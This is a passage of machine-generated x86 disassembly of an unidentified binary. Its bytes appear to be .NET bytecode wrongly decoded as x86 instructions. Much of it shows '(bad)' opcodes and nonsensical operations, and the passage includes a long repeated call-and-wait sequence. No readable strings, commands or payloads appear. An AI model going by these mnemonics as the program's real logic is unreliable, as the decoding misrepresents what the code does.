  405362:	28 24 00             	sub    %ah,(%eax,%eax,1)
  405365:	00 0a                	add    %cl,(%edx)
  405367:	2d 41 02 17 25       	sub    $0x25170241,%eax
  40536c:	0a 7d 8c             	or     -0x74(%ebp),%bh
  40536f:	00 00                	add    %al,(%eax)
  405371:	04 02                	add    $0x2,%al
  405373:	11 07                	adc    %eax,(%edi)
  405375:	7d 8f                	jge    0x405306
  405377:	00 00                	add    %al,(%eax)
  405379:	04 02                	add    $0x2,%al
  40537b:	7c 8d                	jl     0x40530a
  40537d:	00 00                	add    %al,(%eax)
  40537f:	04 12                	add    $0x12,%al
  405381:	07                   	pop    %es
  405382:	02 28                	add    (%eax),%ch
  405384:	38 00                	cmp    %al,(%eax)
  405386:	00 2b                	add    %ch,(%ebx)
  405388:	dd 2c 01             	(bad) (%ecx,%eax,1)
  40538b:	00 00                	add    %al,(%eax)
  40538d:	02 7b 8f             	add    -0x71(%ebx),%bh
  405390:	00 00                	add    %al,(%eax)
  405392:	04 13                	add    $0x13,%al
  405394:	07                   	pop    %es
  405395:	02 7c 8f 00          	add    0x0(%edi,%ecx,4),%bh
  405399:	00 04 fe             	add    %al,(%esi,%edi,8)
  40539c:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  4053a1:	02 15 25 0a 7d 8c    	add    0x8c7d0a25,%dl
  4053a7:	00 00                	add    %al,(%eax)
  4053a9:	04 12                	add    $0x12,%al
  4053ab:	07                   	pop    %es
  4053ac:	28 26                	sub    %ah,(%esi)
  4053ae:	00 00                	add    %al,(%eax)
  4053b0:	0a 13                	or     (%ebx),%dl
  4053b2:	05 11 05 2d 07       	add    $0x72d0511,%eax
  4053b7:	14 0c                	adc    $0xc,%al
  4053b9:	dd e7                	fucom  %st(7)
  4053bb:	00 00                	add    %al,(%eax)
  4053bd:	00 11                	add    %dl,(%ecx)
  4053bf:	05 16 91 19 33       	add    $0x33199116,%eax
  4053c4:	68 07 11 05 17       	push   $0x17051107
  4053c9:	28 47 00             	sub    %al,0x0(%edi)
  4053cc:	00 06                	add    %al,(%esi)
  4053ce:	13 05 11 05 07 7b    	adc    0x7b070511,%eax
  4053d4:	70 00                	jo     0x4053d6
  4053d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4053d9:	0f 00 00             	sldt   (%eax)
  4053dc:	06                   	push   %es
  4053dd:	13 05 11 05 16 91    	adc    0x91160511,%eax
  4053e3:	18 3b                	sbb    %bh,(%ebx)
  4053e5:	f4                   	hlt
  4053e6:	fe                   	(bad)
  4053e7:	ff                   	(bad)
  4053e8:	ff 07                	incl   (%edi)
  4053ea:	11 05 28 46 00 00    	adc    %eax,0x4628
  4053f0:	06                   	push   %es
  4053f1:	13 06                	adc    (%esi),%eax
  4053f3:	11 06                	adc    %eax,(%esi)
  4053f5:	2d 07 14 0c dd       	sub    $0xdd0c1407,%eax
  4053fa:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4053fb:	00 00                	add    %al,(%eax)
  4053fd:	00 07                	add    %al,(%edi)
  4053ff:	11 05 11 06 7b 6e    	adc    %eax,0x6e7b0611
  405405:	00 00                	add    %al,(%eax)
  405407:	04 28                	add    $0x28,%al
  405409:	47                   	inc    %edi
  40540a:	00 00                	add    %al,(%eax)
  40540c:	06                   	push   %es
  40540d:	13 05 11 06 7b 6c    	adc    0x6c7b0611,%eax
  405413:	00 00                	add    %al,(%eax)
  405415:	04 2c                	add    $0x2c,%al
  405417:	10 11                	adc    %dl,(%ecx)
  405419:	05 11 06 7b 6d       	add    $0x6d7b0611,%eax
  40541e:	00 00                	add    %al,(%eax)
  405420:	04 28                	add    $0x28,%al
  405422:	07                   	pop    %es
  405423:	00 00                	add    %al,(%eax)
  405425:	06                   	push   %es
  405426:	13 05 11 05 0c de    	adc    0xde0c0511,%eax
  40542c:	78 11                	js     0x40543f
  40542e:	05 16 91 18 3b       	add    $0x3b189116,%eax
  405433:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405434:	fe                   	(bad)
  405435:	ff                   	(bad)
  405436:	ff 07                	incl   (%edi)
  405438:	11 05 28 46 00 00    	adc    %eax,0x4628
  40543e:	06                   	push   %es
  40543f:	13 06                	adc    (%esi),%eax
  405441:	11 06                	adc    %eax,(%esi)
  405443:	2d 04 14 0c de       	sub    $0xde0c1404,%eax
  405448:	5c                   	pop    %esp
  405449:	07                   	pop    %es
  40544a:	11 05 11 06 7b 6e    	adc    %eax,0x6e7b0611
  405450:	00 00                	add    %al,(%eax)
  405452:	04 28                	add    $0x28,%al
  405454:	47                   	inc    %edi
  405455:	00 00                	add    %al,(%eax)
  405457:	06                   	push   %es
  405458:	13 05 11 06 7b 6c    	adc    0x6c7b0611,%eax
  40545e:	00 00                	add    %al,(%eax)
  405460:	04 2c                	add    $0x2c,%al
  405462:	10 11                	adc    %dl,(%ecx)
  405464:	05 11 06 7b 6d       	add    $0x6d7b0611,%eax
  405469:	00 00                	add    %al,(%eax)
  40546b:	04 28                	add    $0x28,%al
  40546d:	07                   	pop    %es
  40546e:	00 00                	add    %al,(%eax)
  405470:	06                   	push   %es
  405471:	13 05 11 05 07 7b    	adc    0x7b070511,%eax
  405477:	70 00                	jo     0x405479
  405479:	00 04 28             	add    %al,(%eax,%ebp,1)
  40547c:	0f 00 00             	sldt   (%eax)
  40547f:	06                   	push   %es
  405480:	13 05 11 05 0c de    	adc    0xde0c0511,%eax
  405486:	1e                   	push   %ds
  405487:	26 14 0c             	es adc $0xc,%al
  40548a:	de 19                	ficomps (%ecx)
  40548c:	13 08                	adc    (%eax),%ecx
  40548e:	02 1f                	add    (%edi),%bl
  405490:	fe                   	(bad)
  405491:	7d 8c                	jge    0x40541f
  405493:	00 00                	add    %al,(%eax)
  405495:	04 02                	add    $0x2,%al
  405497:	7c 8d                	jl     0x405426
  405499:	00 00                	add    %al,(%eax)
  40549b:	04 11                	add    $0x11,%al
  40549d:	08 28                	or     %ch,(%eax)
  40549f:	94                   	xchg   %eax,%esp
  4054a0:	00 00                	add    %al,(%eax)
  4054a2:	0a de                	or     %dh,%bl
  4054a4:	14 02                	adc    $0x2,%al
  4054a6:	1f                   	pop    %ds
  4054a7:	fe                   	(bad)
  4054a8:	7d 8c                	jge    0x405436
  4054aa:	00 00                	add    %al,(%eax)
  4054ac:	04 02                	add    $0x2,%al
  4054ae:	7c 8d                	jl     0x40543d
  4054b0:	00 00                	add    %al,(%eax)
  4054b2:	04 08                	add    $0x8,%al
  4054b4:	28 95 00 00 0a 2a    	sub    %dl,0x2a0a0000(%ebp)
  4054ba:	00 00                	add    %al,(%eax)
  4054bc:	41                   	inc    %ecx
  4054bd:	34 00                	xor    $0x0,%al
  4054bf:	00 00                	add    %al,(%eax)
  4054c1:	00 00                	add    %al,(%eax)
  4054c3:	00 13                	add    %dl,(%ebx)
  4054c5:	00 00                	add    %al,(%eax)
  4054c7:	00 b4 01 00 00 c7 01 	add    %dh,0x1c70000(%ecx,%eax,1)
  4054ce:	00 00                	add    %al,(%eax)
  4054d0:	05 00 00 00 01       	add    $0x1000000,%eax
  4054d5:	00 00                	add    %al,(%eax)
  4054d7:	01 00                	add    %eax,(%eax)
  4054d9:	00 00                	add    %al,(%eax)
  4054db:	00 0e                	add    %cl,(%esi)
  4054dd:	00 00                	add    %al,(%eax)
  4054df:	00 be 01 00 00 cc    	add    %bh,-0x33ffffff(%esi)
  4054e5:	01 00                	add    %eax,(%eax)
  4054e7:	00 19                	add    %bl,(%ecx)
  4054e9:	00 00                	add    %al,(%eax)
  4054eb:	00 0b                	add    %cl,(%ebx)
  4054ed:	00 00                	add    %al,(%eax)
  4054ef:	01 13                	add    %edx,(%ebx)
  4054f1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4054f4:	25 03 00 00 2a       	and    $0x2a000003,%eax
  4054f9:	00 00                	add    %al,(%eax)
  4054fb:	11 12                	adc    %edx,(%edx)
  4054fd:	00 73 b0             	add    %dh,-0x50(%ebx)
  405500:	00 00                	add    %al,(%eax)
  405502:	0a 72 b7             	or     -0x49(%edx),%dh
  405505:	00 00                	add    %al,(%eax)
  405507:	70 6f                	jo     0x405578
  405509:	b1 00                	mov    $0x0,%cl
  40550b:	00 0a                	add    %cl,(%edx)
  40550d:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  405511:	00 00                	add    %al,(%eax)
  405513:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  405519:	b0 00                	mov    $0x0,%al
  40551b:	00 0a                	add    %cl,(%edx)
  40551d:	72 e9                	jb     0x405508
  40551f:	00 00                	add    %al,(%eax)
  405521:	70 6f                	jo     0x405592
  405523:	b1 00                	mov    $0x0,%cl
  405525:	00 0a                	add    %cl,(%edx)
  405527:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  40552b:	00 00                	add    %al,(%eax)
  40552d:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  405533:	b0 00                	mov    $0x0,%al
  405535:	00 0a                	add    %cl,(%edx)
  405537:	72 2d                	jb     0x405566
  405539:	01 00                	add    %eax,(%eax)
  40553b:	70 6f                	jo     0x4055ac
  40553d:	b1 00                	mov    $0x0,%cl
  40553f:	00 0a                	add    %cl,(%edx)
  405541:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  405545:	00 00                	add    %al,(%eax)
  405547:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  40554d:	b0 00                	mov    $0x0,%al
  40554f:	00 0a                	add    %cl,(%edx)
  405551:	72 71                	jb     0x4055c4
  405553:	01 00                	add    %eax,(%eax)
  405555:	70 6f                	jo     0x4055c6
  405557:	b1 00                	mov    $0x0,%cl
  405559:	00 0a                	add    %cl,(%edx)
  40555b:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  40555f:	00 00                	add    %al,(%eax)
  405561:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  405567:	b0 00                	mov    $0x0,%al
  405569:	00 0a                	add    %cl,(%edx)
  40556b:	72 b3                	jb     0x405520
  40556d:	01 00                	add    %eax,(%eax)
  40556f:	70 6f                	jo     0x4055e0
  405571:	b1 00                	mov    $0x0,%cl
  405573:	00 0a                	add    %cl,(%edx)
  405575:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  405579:	00 00                	add    %al,(%eax)
  40557b:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  405581:	b0 00                	mov    $0x0,%al
  405583:	00 0a                	add    %cl,(%edx)
  405585:	72 fd                	jb     0x405584
  405587:	01 00                	add    %eax,(%eax)
  405589:	70 6f                	jo     0x4055fa
  40558b:	b1 00                	mov    $0x0,%cl
  40558d:	00 0a                	add    %cl,(%edx)
  40558f:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  405593:	00 00                	add    %al,(%eax)
  405595:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  40559b:	b0 00                	mov    $0x0,%al
  40559d:	00 0a                	add    %cl,(%edx)
  40559f:	72 37                	jb     0x4055d8
  4055a1:	02 00                	add    (%eax),%al
  4055a3:	70 6f                	jo     0x405614
  4055a5:	b1 00                	mov    $0x0,%cl
  4055a7:	00 0a                	add    %cl,(%edx)
  4055a9:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  4055ad:	00 00                	add    %al,(%eax)
  4055af:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  4055b5:	b0 00                	mov    $0x0,%al
  4055b7:	00 0a                	add    %cl,(%edx)
  4055b9:	72 83                	jb     0x40553e
  4055bb:	02 00                	add    (%eax),%al
  4055bd:	70 6f                	jo     0x40562e
  4055bf:	b1 00                	mov    $0x0,%cl
  4055c1:	00 0a                	add    %cl,(%edx)
  4055c3:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  4055c7:	00 00                	add    %al,(%eax)
  4055c9:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  4055cf:	b0 00                	mov    $0x0,%al
  4055d1:	00 0a                	add    %cl,(%edx)
  4055d3:	72 cf                	jb     0x4055a4
  4055d5:	02 00                	add    (%eax),%al
  4055d7:	70 6f                	jo     0x405648
  4055d9:	b1 00                	mov    $0x0,%cl
  4055db:	00 0a                	add    %cl,(%edx)
  4055dd:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  4055e1:	00 00                	add    %al,(%eax)
  4055e3:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  4055e9:	b0 00                	mov    $0x0,%al
  4055eb:	00 0a                	add    %cl,(%edx)
  4055ed:	72 19                	jb     0x405608
  4055ef:	03 00                	add    (%eax),%eax
  4055f1:	70 6f                	jo     0x405662
  4055f3:	b1 00                	mov    $0x0,%cl
  4055f5:	00 0a                	add    %cl,(%edx)
  4055f7:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  4055fb:	00 00                	add    %al,(%eax)
  4055fd:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  405603:	b0 00                	mov    $0x0,%al
  405605:	00 0a                	add    %cl,(%edx)
  405607:	72 6b                	jb     0x405674
  405609:	03 00                	add    (%eax),%eax
  40560b:	70 6f                	jo     0x40567c
  40560d:	b1 00                	mov    $0x0,%cl
  40560f:	00 0a                	add    %cl,(%edx)
  405611:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  405615:	00 00                	add    %al,(%eax)
  405617:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  40561d:	b0 00                	mov    $0x0,%al
  40561f:	00 0a                	add    %cl,(%edx)
  405621:	72 9f                	jb     0x4055c2
  405623:	03 00                	add    (%eax),%eax
  405625:	70 6f                	jo     0x405696
  405627:	b1 00                	mov    $0x0,%cl
  405629:	00 0a                	add    %cl,(%edx)
  40562b:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  40562f:	00 00                	add    %al,(%eax)
  405631:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  405637:	b0 00                	mov    $0x0,%al
  405639:	00 0a                	add    %cl,(%edx)
  40563b:	72 e5                	jb     0x405622
  40563d:	03 00                	add    (%eax),%eax
  40563f:	70 6f                	jo     0x4056b0
  405641:	b1 00                	mov    $0x0,%cl
  405643:	00 0a                	add    %cl,(%edx)
  405645:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  405649:	00 00                	add    %al,(%eax)
  40564b:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  405651:	b0 00                	mov    $0x0,%al
  405653:	00 0a                	add    %cl,(%edx)
  405655:	72 2b                	jb     0x405682
  405657:	04 00                	add    $0x0,%al
  405659:	70 6f                	jo     0x4056ca
  40565b:	b1 00                	mov    $0x0,%cl
  40565d:	00 0a                	add    %cl,(%edx)
  40565f:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  405663:	00 00                	add    %al,(%eax)
  405665:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  40566b:	b0 00                	mov    $0x0,%al
  40566d:	00 0a                	add    %cl,(%edx)
  40566f:	72 6f                	jb     0x4056e0
  405671:	04 00                	add    $0x0,%al
  405673:	70 6f                	jo     0x4056e4
  405675:	b1 00                	mov    $0x0,%cl
  405677:	00 0a                	add    %cl,(%edx)
  405679:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  40567d:	00 00                	add    %al,(%eax)
  40567f:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  405685:	b0 00                	mov    $0x0,%al
  405687:	00 0a                	add    %cl,(%edx)
  405689:	72 bb                	jb     0x405646
  40568b:	04 00                	add    $0x0,%al
  40568d:	70 6f                	jo     0x4056fe
  40568f:	b1 00                	mov    $0x0,%cl
  405691:	00 0a                	add    %cl,(%edx)
  405693:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  405697:	00 00                	add    %al,(%eax)
  405699:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  40569f:	b0 00                	mov    $0x0,%al
  4056a1:	00 0a                	add    %cl,(%edx)
  4056a3:	72 8c                	jb     0x405631
  4056a5:	05 00 70 6f b1       	add    $0xb16f7000,%eax
  4056aa:	00 00                	add    %al,(%eax)
  4056ac:	0a 26                	or     (%esi),%ah
  4056ae:	20 50 00             	and    %dl,0x0(%eax)
  4056b1:	00 00                	add    %al,(%eax)
  4056b3:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  4056b9:	b0 00                	mov    $0x0,%al
  4056bb:	00 0a                	add    %cl,(%edx)
  4056bd:	72 65                	jb     0x405724
  4056bf:	06                   	push   %es
  4056c0:	00 70 6f             	add    %dh,0x6f(%eax)
  4056c3:	b1 00                	mov    $0x0,%cl
  4056c5:	00 0a                	add    %cl,(%edx)
  4056c7:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  4056cb:	00 00                	add    %al,(%eax)
  4056cd:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  4056d3:	b0 00                	mov    $0x0,%al
  4056d5:	00 0a                	add    %cl,(%edx)
  4056d7:	72 a1                	jb     0x40567a
  4056d9:	06                   	push   %es
  4056da:	00 70 6f             	add    %dh,0x6f(%eax)
  4056dd:	b1 00                	mov    $0x0,%cl
  4056df:	00 0a                	add    %cl,(%edx)
  4056e1:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  4056e5:	00 00                	add    %al,(%eax)
  4056e7:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  4056ed:	b0 00                	mov    $0x0,%al
  4056ef:	00 0a                	add    %cl,(%edx)
  4056f1:	72 ef                	jb     0x4056e2
  4056f3:	06                   	push   %es
  4056f4:	00 70 6f             	add    %dh,0x6f(%eax)
  4056f7:	b1 00                	mov    $0x0,%cl
  4056f9:	00 0a                	add    %cl,(%edx)
  4056fb:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  4056ff:	00 00                	add    %al,(%eax)
  405701:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  405707:	b0 00                	mov    $0x0,%al
  405709:	00 0a                	add    %cl,(%edx)
  40570b:	72 3d                	jb     0x40574a
  40570d:	07                   	pop    %es
  40570e:	00 70 6f             	add    %dh,0x6f(%eax)
  405711:	b1 00                	mov    $0x0,%cl
  405713:	00 0a                	add    %cl,(%edx)
  405715:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  405719:	00 00                	add    %al,(%eax)
  40571b:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  405721:	b0 00                	mov    $0x0,%al
  405723:	00 0a                	add    %cl,(%edx)
  405725:	72 89                	jb     0x4056b0
  405727:	07                   	pop    %es
  405728:	00 70 6f             	add    %dh,0x6f(%eax)
  40572b:	b1 00                	mov    $0x0,%cl
  40572d:	00 0a                	add    %cl,(%edx)
  40572f:	26 20 50 00          	and    %dl,%es:0x0(%eax)
  405733:	00 00                	add    %al,(%eax)
  405735:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  40573b:	b0 00                	mov    $0x0,%al
  40573d:	00 0a                	add    %cl,(%edx)
  40573f:	72 6f                	jb     0x4057b0
  405741:	04 00                	add    $0x0,%al
  405743:	70 72                	jo     0x4057b7
  405745:	dd 07                	fldl   (%edi)
  405747:	00 70 6f             	add    %dh,0x6f(%eax)
  40574a:	b3 00                	mov    $0x0,%bl
  40574c:	00 0a                	add    %cl,(%edx)
  40574e:	26 20 78 00          	and    %bh,%es:0x0(%eax)
  405752:	00 00                	add    %al,(%eax)
  405754:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  40575a:	b0 00                	mov    $0x0,%al
  40575c:	00 0a                	add    %cl,(%edx)
  40575e:	72 89                	jb     0x4056e9
  405760:	07                   	pop    %es
  405761:	00 70 72             	add    %dh,0x72(%eax)
  405764:	ba 08 00 70 6f       	mov    $0x6f700008,%edx
  405769:	b3 00                	mov    $0x0,%bl
  40576b:	00 0a                	add    %cl,(%edx)
  40576d:	26 20 78 00          	and    %bh,%es:0x0(%eax)
  405771:	00 00                	add    %al,(%eax)
  405773:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  405779:	b0 00                	mov    $0x0,%al
  40577b:	00 0a                	add    %cl,(%edx)
  40577d:	72 0a                	jb     0x405789
  40577f:	09 00                	or     %eax,(%eax)
  405781:	70 72                	jo     0x4057f5
  405783:	6c                   	insb   (%dx),%es:(%edi)
  405784:	09 00                	or     %eax,(%eax)
  405786:	70 6f                	jo     0x4057f7
  405788:	b3 00                	mov    $0x0,%bl
  40578a:	00 0a                	add    %cl,(%edx)
  40578c:	26 20 78 00          	and    %bh,%es:0x0(%eax)
  405790:	00 00                	add    %al,(%eax)
  405792:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  405798:	b0 00                	mov    $0x0,%al
  40579a:	00 0a                	add    %cl,(%edx)
  40579c:	72 b6                	jb     0x405754
  40579e:	09 00                	or     %eax,(%eax)
  4057a0:	70 72                	jo     0x405814
  4057a2:	fe 09                	decb   (%ecx)
  4057a4:	00 70 6f             	add    %dh,0x6f(%eax)
  4057a7:	b3 00                	mov    $0x0,%bl
  4057a9:	00 0a                	add    %cl,(%edx)
  4057ab:	26 20 78 00          	and    %bh,%es:0x0(%eax)
  4057af:	00 00                	add    %al,(%eax)
  4057b1:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  4057b7:	b0 00                	mov    $0x0,%al
  4057b9:	00 0a                	add    %cl,(%edx)
  4057bb:	72 b3                	jb     0x405770
  4057bd:	0a 00                	or     (%eax),%al
  4057bf:	70 72                	jo     0x405833
  4057c1:	03 0b                	add    (%ebx),%ecx
  4057c3:	00 70 6f             	add    %dh,0x6f(%eax)
  4057c6:	b3 00                	mov    $0x0,%bl
  4057c8:	00 0a                	add    %cl,(%edx)
  4057ca:	26 20 78 00          	and    %bh,%es:0x0(%eax)
  4057ce:	00 00                	add    %al,(%eax)
  4057d0:	28 b2 00 00 0a 73    	sub    %dh,0x730a0000(%edx)
  4057d6:	b0 00                	mov    $0x0,%al
  4057d8:	00 0a                	add    %cl,(%edx)
  4057da:	72 ac                	jb     0x405788
  4057dc:	0c 00                	or     $0x0,%al
  4057de:	70 72                	jo     0x405852
  4057e0:	06                   	push   %es
  4057e1:	0d 00 70 6f b3       	or     $0xb36f7000,%eax
  4057e6:	00 00                	add    %al,(%eax)
  4057e8:	0a 26                	or     (%esi),%ah
  4057ea:	20 78 00             	and    %bh,0x0(%eax)
  4057ed:	00 00                	add    %al,(%eax)
  4057ef:	28 b2 00 00 0a 28    	sub    %dh,0x280a0000(%edx)
  4057f5:	1b 00                	sbb    (%eax),%eax
  4057f7:	00 0a                	add    %cl,(%edx)
  4057f9:	7d 9c                	jge    0x405797
  4057fb:	00 00                	add    %al,(%eax)
  4057fd:	04 12                	add    $0x12,%al
  4057ff:	00 15 7d 9b 00 00    	add    %dl,0x9b7d
  405805:	04 12                	add    $0x12,%al
  405807:	00 7c 9c 00          	add    %bh,0x0(%esp,%ebx,4)
  40580b:	00 04 12             	add    %al,(%edx,%edx,1)
  40580e:	00 28                	add    %ch,(%eax)
  405810:	39 00                	cmp    %eax,(%eax)
  405812:	00 2b                	add    %ch,(%ebx)
  405814:	12 00                	adc    (%eax),%al
  405816:	7c 9c                	jl     0x4057b4
  405818:	00 00                	add    %al,(%eax)
  40581a:	04 28                	add    $0x28,%al
  40581c:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  405821:	00 00                	add    %al,(%eax)
  405823:	00 1b                	add    %bl,(%ebx)
  405825:	30 06                	xor    %al,(%esi)
  405827:	00 b7 00 00 00 2b    	add    %dh,0x2b000000(%edi)
  40582d:	00 00                	add    %al,(%eax)
  40582f:	11 03                	adc    %eax,(%ebx)
  405831:	6f                   	outsl  %ds:(%esi),(%dx)
  405832:	b5 00                	mov    $0x0,%ch
  405834:	00 0a                	add    %cl,(%edx)
  405836:	75 0b                	jne    0x405843
  405838:	00 00                	add    %al,(%eax)
  40583a:	01 0a                	add    %ecx,(%edx)
  40583c:	7e 90                	jle    0x4057ce
  40583e:	00 00                	add    %al,(%eax)
  405840:	04 39                	add    $0x39,%al
  405842:	81 00 00 00 7e 90    	addl   $0x907e0000,(%eax)
  405848:	00 00                	add    %al,(%eax)
  40584a:	04 7b                	add    $0x7b,%al
  40584c:	46                   	inc    %esi
  40584d:	00 00                	add    %al,(%eax)
  40584f:	04 6f                	add    $0x6f,%al
  405851:	85 00                	test   %eax,(%eax)
  405853:	00 0a                	add    %cl,(%edx)
  405855:	0b 2b                	or     (%ebx),%ebp
  405857:	56                   	push   %esi
  405858:	12 01                	adc    (%ecx),%al
  40585a:	28 86 00 00 0a 0c    	sub    %al,0xc0a0000(%esi)
  405860:	08 7b 4b             	or     %bh,0x4b(%ebx)
  405863:	00 00                	add    %al,(%eax)
  405865:	04 17                	add    $0x17,%al
  405867:	33 45 08             	xor    0x8(%ebp),%eax
  40586a:	17                   	pop    %ss
  40586b:	8d 2e                	lea    (%esi),%ebp
  40586d:	00 00                	add    %al,(%eax)
  40586f:	01 25 16 19 9c 28    	add    %esp,0x289c1916
  405875:	27                   	daa
  405876:	00 00                	add    %al,(%eax)
  405878:	0a 06                	or     (%esi),%al
  40587a:	6f                   	outsl  %ds:(%esi),(%dx)
  40587b:	3a 00                	cmp    (%eax),%al
  40587d:	00 0a                	add    %cl,(%edx)
  40587f:	28 b6 00 00 0a 06    	sub    %dh,0x60a0000(%esi)
  405885:	6f                   	outsl  %ds:(%esi),(%dx)
  405886:	3c 00                	cmp    $0x0,%al
  405888:	00 0a                	add    %cl,(%edx)
  40588a:	28 6b 00             	sub    %ch,0x0(%ebx)
  40588d:	00 0a                	add    %cl,(%edx)
  40588f:	6f                   	outsl  %ds:(%esi),(%dx)
  405890:	3b 00                	cmp    (%eax),%eax
  405892:	00 0a                	add    %cl,(%edx)
  405894:	28 45 00             	sub    %al,0x0(%ebp)
  405897:	00 06                	add    %al,(%esi)
  405899:	6f                   	outsl  %ds:(%esi),(%dx)
  40589a:	32 00                	xor    (%eax),%al
  40589c:	00 06                	add    %al,(%esi)
  40589e:	6f                   	outsl  %ds:(%esi),(%dx)
  40589f:	b7 00                	mov    $0x0,%bh
  4058a1:	00 0a                	add    %cl,(%edx)
  4058a3:	26 20 e8             	es and %ch,%al
  4058a6:	03 00                	add    (%eax),%eax
  4058a8:	00 28                	add    %ch,(%eax)
  4058aa:	b2 00                	mov    $0x0,%dl
  4058ac:	00 0a                	add    %cl,(%edx)
  4058ae:	12 01                	adc    (%ecx),%al
  4058b0:	28 87 00 00 0a 2d    	sub    %al,0x2d0a0000(%edi)
  4058b6:	a1 de 0e 12 01       	mov    0x1120ede,%eax
  4058bb:	fe                   	(bad)
  4058bc:	16                   	push   %ss
  4058bd:	13 00                	adc    (%eax),%eax
  4058bf:	00 1b                	add    %bl,(%ebx)
  4058c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c2:	4b                   	dec    %ebx
  4058c3:	00 00                	add    %al,(%eax)
  4058c5:	0a dc                	or     %ah,%bl
  4058c7:	de 03                	fiadds (%ebx)
  4058c9:	26 de 00             	fiadds %es:(%eax)
  4058cc:	28 59 00             	sub    %bl,0x0(%ecx)
  4058cf:	00 0a                	add    %cl,(%edx)
  4058d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4058d2:	5a                   	pop    %edx
  4058d3:	00 00                	add    %al,(%eax)
  4058d5:	0a 28                	or     (%eax),%ch
  4058d7:	5b                   	pop    %ebx
  4058d8:	00 00                	add    %al,(%eax)
  4058da:	0a 26                	or     (%esi),%ah
  4058dc:	28 57 00             	sub    %dl,0x0(%edi)
  4058df:	00 0a                	add    %cl,(%edx)
  4058e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4058e2:	58                   	pop    %eax
  4058e3:	00 00                	add    %al,(%eax)
  4058e5:	0a 2a                	or     (%edx),%ch
  4058e7:	00 01                	add    %al,(%ecx)
  4058e9:	1c 00                	sbb    $0x0,%al
  4058eb:	00 02                	add    %al,(%edx)
  4058ed:	00 26                	add    %ah,(%esi)
  4058ef:	00 63 89             	add    %ah,-0x77(%ebx)
  4058f2:	00 0e                	add    %cl,(%esi)
  4058f4:	00 00                	add    %al,(%eax)
  4058f6:	00 00                	add    %al,(%eax)
  4058f8:	00 00                	add    %al,(%eax)
  4058fa:	0c 00                	or     $0x0,%al
  4058fc:	8d 99 00 03 01 00    	lea    0x10300(%ecx),%ebx
  405902:	00 01                	add    %al,(%ecx)
  405904:	13 30                	adc    (%eax),%esi
  405906:	03 00                	add    (%eax),%eax
  405908:	72 00                	jb     0x40590a
  40590a:	00 00                	add    %al,(%eax)
  40590c:	00 00                	add    %al,(%eax)
  40590e:	00 00                	add    %al,(%eax)
  405910:	73 09                	jae    0x40591b
  405912:	00 00                	add    %al,(%eax)
  405914:	06                   	push   %es
  405915:	80 91 00 00 04 72 5c 	adcb   $0x5c,0x72040000(%ecx)
  40591c:	0d 00 70 80 92       	or     $0x92807000,%eax
  405921:	00 00                	add    %al,(%eax)
  405923:	04 20                	add    $0x20,%al
  405925:	50                   	push   %eax
  405926:	00 00                	add    %al,(%eax)
  405928:	00 80 93 00 00 04    	add    %al,0x4000093(%eax)
  40592e:	1f                   	pop    %ds
  40592f:	20 8d 2e 00 00 01    	and    %cl,0x100002e(%ebp)
  405935:	25 d0 d0 00 00       	and    $0xd0d0,%eax
  40593a:	04 28                	add    $0x28,%al
  40593c:	9b                   	fwait
  40593d:	00 00                	add    %al,(%eax)
  40593f:	0a 80 94 00 00 04    	or     0x4000094(%eax),%al
  405945:	20 50 c3             	and    %dl,-0x3d(%eax)
  405948:	00 00                	add    %al,(%eax)
